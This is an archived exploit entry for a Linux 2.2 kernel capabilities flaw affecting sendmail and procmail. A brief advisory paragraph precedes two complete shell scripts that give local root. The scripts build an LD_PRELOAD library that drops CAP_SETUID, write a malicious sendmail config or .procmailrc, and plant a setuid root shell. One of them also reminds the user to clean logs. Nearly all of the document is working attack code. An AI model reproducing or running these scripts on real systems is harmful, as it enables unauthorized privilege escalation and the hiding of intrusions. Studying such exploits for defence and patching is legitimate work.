source: http://www.securityfocus.com/bid/1322/info
 
POSIX "Capabilities" have recently been implemented in the Linux kernel. These "Capabilities" are an additional form of privilege control to enable more specific control over what priviliged processes can do. Capabilities are implemented as three (fairly large) bitfields, which each bit representing a specific action a privileged process can perform. By setting specific bits, the actions of priviliged processes can be controlled -- access can be granted for various functions only to the specific parts of a program that require them. It is a security measure. The problem is that capabilities are copied with fork() execs, meaning that if capabilities are modified by a parent process, they can be carried over. The way that this can be exploited is by setting all of the capabilities to zero (meaning, all of the bits are off) in each of the three bitfields and then executing a setuid program that attempts to drop priviliges before executing code that could be dangerous if run as root, such as what sendmail does. When sendmail attempts to drop priviliges using setuid(getuid()), it fails not having the capabilities required to do so in its bitfields. It continues executing with superuser priviliges, and can run a users .forward file as root leading to a complete compromise. Procmail can also be exploited in this manner. 

#!/bin/sh

echo "+-----------------------------------------------------------+"
echo "|      Linux kernel 2.2.X (X<=15) & sendmail <= 8.10.1      |"
echo "|                    local root exploit                     |"
echo "|                                                           |"
echo "|   Bugs found and exploit written by Wojciech Purczynski   |"
echo "|      wp@elzabsoft.pl   cliph/ircnet   Vooyec/dalnet       |"
echo "+-----------------------------------------------------------+"

TMPDIR=/tmp/foo
SUIDSHELL=/tmp/sush
SHELL=/bin/tcsh

umask 022
echo "Creating temporary directory"
mkdir -p $TMPDIR
cd $TMPDIR

echo "Creating anti-noexec library (capdrop.c)"
cat <<_FOE_ > capdrop.c
#define __KERNEL__
#include <linux/capability.h>
#undef __KERNEL__
#include <linux/unistd.h>
_syscall2(int, capset, cap_user_header_t, header, const cap_user_data_t, data)
extern int capset(cap_user_header_t header, cap_user_data_t data);
void unsetenv(const char*);
void _init(void) {
        struct __user_cap_header_struct caph={_LINUX_CAPABILITY_VERSION, 0};
        struct __user_cap_data_struct capd={0, 0, 0xfffffe7f};
        unsetenv("LD_PRELOAD");
        capset(&caph, &capd); 
        system("echo|/usr/sbin/sendmail -C$TMPDIR/sm.cf $USER");
}
_FOE_
echo "Compiling anti-noexec library (capdrop.so)"
cc capdrop.c -c -o capdrop.o
ld -shared capdrop.o -o capdrop.so

echo "Creating suid shell (sush.c)"
cat <<_FOE_ > sush.c
#include <unistd.h>
int main() { setuid(0); setgid(0); execl("/bin/sh", "sh", NULL); }
_FOE_

echo "Compiling suid shell (sush.c)"
cc sush.c -o $TMPDIR/sush

echo "Creating shell script"
cat <<_FOE_ >script
mv $TMPDIR/sush $SUIDSHELL
chown root.root $SUIDSHELL
chmod 4111 $SUIDSHELL
exit 0
_FOE_

echo "Creating own sm.cf"
cat <<_FOE_ >$TMPDIR/sm.cf
O QueueDirectory=$TMPDIR
O ForwardPath=/no_forward_file
S0
R\$*    \$#local \$: \$1
Mlocal, P=$SHELL, F=lsDFMAw5:/|@qSPfhn9, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL,
        T=DNS/RFC822/X-Unix, A=$SHELL $TMPDIR/script
_FOE_

echo "Dropping CAP_SETUID and calling sendmail"
export LD_PRELOAD=$TMPDIR/capdrop.so
/bin/true
unset LD_PRELOAD

echo "Waiting for suid shell ($SUIDSHELL)"
while [ ! -f $SUIDSHELL ]; do sleep 1; done

echo "Removing everything"
cd ..
rm -fr $TMPDIR

echo "Suid shell at $SUIDSHELL"
$SUIDSHELL

#!/bin/sh

echo "+-----------------------------------------------------+"
echo "|   Sendmail & procmail & kernel local root exploit   |"
echo "|                                                     |"
echo "|Bugs found and exploit written by Wojciech Purczynski|"
echo "|    wp@elzabsoft.pl   cliph/ircnet  Vooyec/dalnet    |"
echo "+-----------------------------------------------------+"

echo Creating cap.c

cat <<_FOE_ > cap.c
#define __KERNEL__
#include <linux/capability.h>
#undef __KERNEL__
#include <linux/unistd.h>

_syscall2(int, capset, cap_user_header_t, header, const cap_user_data_t, data)
extern int capset(cap_user_header_t header, cap_user_data_t data);
int main()
{
        struct __user_cap_header_struct caph={
                _LINUX_CAPABILITY_VERSION,
                0
        };
        struct __user_cap_data_struct capd={
                0,
                0,
                0xfffffe7f
        };
        capset(&caph, &capd);
        system("echo|/usr/sbin/sendmail $USER");
}
_FOE_

echo Creating $HOME/.procmailrc
PROCMAILRCBAK=$HOME/.procmailrc.bak
mv -f $HOME/.procmailrc $PROCMAILRCBAK
cat <<_FOE_ > $HOME/.procmailrc
:H
*
|/bin/tcsh -c "rm -fr /bin/sush; mv -f /tmp/sush /bin/sush; chown root.root /bin/sush; chmod 4111 /bin/sush"
_FOE_

echo Compiling cap.c -> cap
cc cap.c -o cap

echo Creating sush.c
cat <<_FOE_ > sush.c
#include <unistd.h>
int main()
{
        setuid(0);
        setgid(0);
        execl("/bin/bash", "bash", NULL);
}
_FOE_

echo Compiling sush
cc sush.c -o /tmp/sush

echo Executing cap
./cap
echo Don\'t forget to clean logs

echo Waiting for suid shell
while [ ! -f /bin/sush ]; do
sleep 1
done

echo Cleaning everything
rm -fr $HOME/.procmailrc cap.c cap sush.c
mv $PROCMAILRCBAK $HOME/.procmailrc

echo Executing suid shell
/bin/sush
